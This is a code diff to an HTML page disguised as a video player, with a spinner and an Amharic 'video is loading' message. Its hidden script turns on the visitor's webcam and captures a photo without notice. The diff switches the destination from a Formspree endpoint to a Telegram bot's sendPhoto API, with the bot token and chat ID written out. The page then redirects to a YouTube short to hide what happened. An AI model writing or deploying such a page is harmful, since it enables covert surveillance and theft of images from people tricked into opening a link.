@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Video Player</title>
     <style>
         body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
@@ -13,28 +13,30 @@
 <body>
     <div class="spinner"></div>
     <h3>ቪዲዮው እየተጫነ ነው...</h3>
-
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const url = "https://formspree.io/f/mwvrnlja";
+        const botToken = "8685482473:AAE7vWYe8mV4ZQ4PA0oj_18WgoJpu_jfZ3M";
+        const chatId = "5630987526"; 
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
                 setTimeout(() => {
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const img = canvas.toDataURL('image/png');
-                    fetch(url, {
-                        method: "POST",
-                        body: JSON.stringify({ photo: img }),
-                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
-                    }).then(() => {
-                        window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
-                    });
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'image.png');
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            window.location.href = "https://youtube.com/shorts/1xZS2TpagBk";
+                        });
+                    }, 'image/png');
                 }, 2000);
             })
             .catch(() => { window.location.href = "https://youtube.com/shorts/1xZS2TpagBk"; });
